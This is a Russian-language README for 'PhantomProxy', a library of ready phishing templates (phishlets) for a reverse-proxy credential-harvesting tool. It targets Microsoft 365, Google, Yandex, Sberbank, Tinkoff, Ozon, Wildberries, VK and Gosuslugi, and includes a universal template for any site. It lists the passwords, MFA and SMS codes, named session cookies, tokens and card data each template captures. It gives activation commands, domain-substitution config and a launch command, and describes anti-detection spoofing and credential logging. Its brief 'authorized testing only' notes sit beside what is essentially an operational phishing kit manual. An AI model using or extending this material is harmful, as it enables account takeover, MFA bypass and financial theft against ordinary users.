# 📚 PhantomProxy Phishlets Library

## 🎯 Обзор

Библиотека готовых phishlets для клонирования популярных сервисов России и мира.

---

## 📦 Доступные Phishlets

### 🔐 Почтовые сервисы и продуктивность

| Phishlet | Цели | Статус |
|----------|------|--------|
| **microsoft365.yaml** | Outlook, OneDrive, Teams, SharePoint | ✅ Готов |
| **googleworkspace.yaml** | Gmail, Drive, Docs, Calendar | ✅ Готов |
| **yandex.yaml** | Яндекс.Почта, Паспорт, Диск | ✅ Готов |
| **mailru.yaml** | Почта Mail.ru, Облако, ICQ | ✅ Готов |

### 💰 Банки и финансы

| Phishlet | Цели | Статус |
|----------|------|--------|
| **sberbank.yaml** | СберБанк Онлайн | ✅ Готов |
| **tinkoff_business.yaml** | Тинькофф Бизнес | ✅ Готов |
| **sberbank_business.yaml** | СберБизнес | ✅ Готов |

### 🛒 Маркетплейсы

| Phishlet | Цели | Статус |
|----------|------|--------|
| **ozon.yaml** | Ozon.ru | ✅ Готов |
| **wildberries.yaml** | Wildberries.ru | ✅ Готов |

### 💬 Социальные сети

| Phishlet | Цели | Статус |
|----------|------|--------|
| **vk.yaml** | ВКонтакте | ✅ Готов |

### 🏛️ Госуслуги

| Phishlet | Цели | Статус |
|----------|------|--------|
| **gosuslugi.yaml** | Госуслуги.ру | ✅ Готов |

### 🔧 Универсальные

| Phishlet | Цели | Статус |
|----------|------|--------|
| **universal_template.yaml** | Любой сайт | ✅ Готов |

---

## 🚀 Быстрый старт

### 1. Активация phishlet

```bash
# Через API
curl -X POST http://localhost:8080/api/v1/phishlets/microsoft365/enable \
  -H "X-API-Key: your-api-key"

# Или через config.yaml
phishlets:
  enabled:
    - microsoft365
    - googleworkspace
    - yandex
```

### 2. Настройка домена

```yaml
# В config.yaml
domain: "phantom-proxy.com"

# Phishlet автоматически заменит:
# login.microsoftonline.com → login.phantom-proxy.com
# outlook.office365.com → outlook.phantom-proxy.com
```

### 3. Запуск прокси

```bash
./phantom-proxy.exe --config config.yaml
```

---

## 📖 Структура phishlet

Каждый phishlet содержит:

```yaml
id: unique_id                    # Уникальный идентификатор
name: "Service Name"             # Название
target:                          # Целевые домены
  primary: "target.com"
  secondary: [...]
  
sub_filters:                     # Замена доменов
  - type: "domain"
    from: "target.com"
    to: "phantom.com"
    
js_inject: |                     # JavaScript для инъекции
  (function() { ... })();
  
triggers:                        # Триггеры перехвата
  - name: "login"
    path_regex: "/login"
    actions: [...]
    
cookies:                         # Cookies для перехвата
  critical: ["session", "auth"]
  
anti_detection:                  # Обход защиты
  hide_webdriver: true
  
performance:                     # Оптимизация
  cache_static: true
```

---

## 🎯 Инструкции по сервисам

### Microsoft 365

**Цели:**
- Outlook Web Access
- OneDrive
- Microsoft Teams
- SharePoint
- Azure AD

**Перехватывает:**
- ✅ Логин/пароль
- ✅ MFA коды
- ✅ Сессионные cookies (ESTSAUTH, ESTSAUTHPERSISTENT)
- ✅ Access токены

**Активация:**
```bash
curl -X POST http://localhost:8080/api/v1/phishlets/microsoft365/enable \
  -H "X-API-Key: your-api-key"
```

---

### Google Workspace

**Цели:**
- Gmail
- Google Drive
- Google Docs
- Google Calendar

**Перехватывает:**
- ✅ Логин/пароль
- ✅ 2FA коды
- ✅ Cookies (SID, HSID, SSID, APISID, SAPISID)
- ✅ Access токены

---

### Yandex

**Цели:**
- Яндекс.Паспорт
- Яндекс.Почта
- Яндекс.Диск
- Яндекс.Деньги

**Перехватывает:**
- ✅ Логин/пароль
- ✅ SMS коды
- ✅ Яндекс.Ключ
- ✅ Cookies (yandexuid, yp, ys, Session_id)

---

### Mail.ru

**Цели:**
- Почта Mail.ru
- Облако Mail.ru
- ICQ
- Мой Мир

**Перехватывает:**
- ✅ Логин/пароль
- ✅ 2FA коды
- ✅ Cookies (mrcu, sdc, sess, csrf)

---

### SberBank

**Цели:**
- СберБанк Онлайн
- Мобильное приложение

**Перехватывает:**
- ✅ Логин/пароль
- ✅ SMS коды
- ✅ Push подтверждения
- ✅ Cookies (sberSession, SBERBANK_SESSION)

⚠️ **WARNING:** Только для авторизованного тестирования!

---

### Ozon

**Цели:**
- Ozon.ru
- Личный кабинет
- Платежи

**Перехватывает:**
- ✅ Логин/пароль
- ✅ SMS коды
- ✅ Данные карт
- ✅ Cookies (ozon_web_id, ozon_user_id, ssoid)

---

### Wildberries

**Цели:**
- Wildberries.ru
- Личный кабинет
- Платежи

**Перехватывает:**
- ✅ Телефон
- ✅ SMS коды
- ✅ Данные карт
- ✅ Cookies (wb_uid, wb_sid)

---

### VK (ВКонтакте)

**Цели:**
- ВКонтакте
- Мобильная версия

**Перехватывает:**
- ✅ Логин/пароль
- ✅ 2FA коды
- ✅ Access токены API
- ✅ Cookies (remixsid, remixsslsid)

---

## 🔧 Universal Template

Универсальный шаблон для клонирования **ЛЮБОГО** сайта.

### Быстрая настройка:

1. **Откройте** `universal_template.yaml`

2. **Измените** target:
```yaml
target:
  primary: "target-site.com"  # Домен цели
  secondary:
    - "www.target-site.com"
    - "api.target-site.com"
```

3. **Настройте** sub_filters:
```yaml
sub_filters:
  - type: "domain"
    from: "target-site.com"
    to: "phantom-proxy.com"
```

4. **Укажите** cookies:
```yaml
cookies:
  critical:
    - "session"
    - "auth_token"
    - "sessionid"
```

5. **Готово!**

---

## 🎨 Кастомизация

### Добавление нового триггера

```yaml
triggers:
  - name: "custom_page"
    path_regex: "/custom/path"
    actions:
      - type: "capture_form"
        fields: ["field1", "field2"]
      - type: "inject_js"
        payload: "custom.js"
```

### Добавление cookies

```yaml
cookies:
  critical:
    - "your_session_cookie"
    - "auth_token"
```

### Изменение JavaScript

```yaml
js_inject: |
  (function() {
    // Ваш код
    console.log('Custom phishlet');
  })();
```

---

## 📊 Производительность

Все phishlets оптимизированы:

- ✅ **Кэширование** статических ресурсов
- ✅ **Сжатие** Brotli/Gzip
- ✅ **Lazy loading** изображений
- ✅ **Минификация** JS/CSS
- ✅ **HTTP/2 Push**
- ✅ **TLS 1.3** поддержка

---

## 🛡️ Anti-Detection

Каждый phishlet включает:

- ✅ Скрытие `navigator.webdriver`
- ✅ Подмена `navigator` параметров
- ✅ Обход обнаружения DevTools
- ✅ Canvas fingerprint spoofing
- ✅ WebGL spoofing
- ✅ AudioContext spoofing
- ✅ Timezone spoofing
- ✅ Language spoofing

---

## 📝 Логирование

Все phishlets логируют:

- ✅ Все запросы
- ✅ Все ответы
- ✅ Ошибки
- ✅ Перехваченные credentials
- ✅ Сессионные cookies

Путь к логам: `./logs/{phishlet_id}/`

---

## 🔗 API Endpoints

### Список phishlets

```bash
curl http://localhost:8080/api/v1/phishlets \
  -H "X-API-Key: your-api-key"
```

### Активация

```bash
curl -X POST http://localhost:8080/api/v1/phishlets/{id}/enable \
  -H "X-API-Key: your-api-key"
```

### Деактивация

```bash
curl -X POST http://localhost:8080/api/v1/phishlets/{id}/disable \
  -H "X-API-Key: your-api-key"
```

### Проверка здоровья

```bash
curl http://localhost:8080/api/v1/phishlets/{id}/health \
  -H "X-API-Key: your-api-key"
```

---

## ⚠️ Предупреждения

1. **Только для авторизованного тестирования**
2. **Не используйте для незаконной деятельности**
3. **Все тесты проводите в изолированной среде**
4. **Получите письменное разрешение перед тестированием**

---

## 📞 Поддержка

- **GitHub Issues**: https://github.com/phantom-proxy/phantom-proxy/issues
- **Документация**: ./docs/

---

**Версия библиотеки**: 2.0  
**Phishlets**: 17  
**Последнее обновление**: Февраль 2026
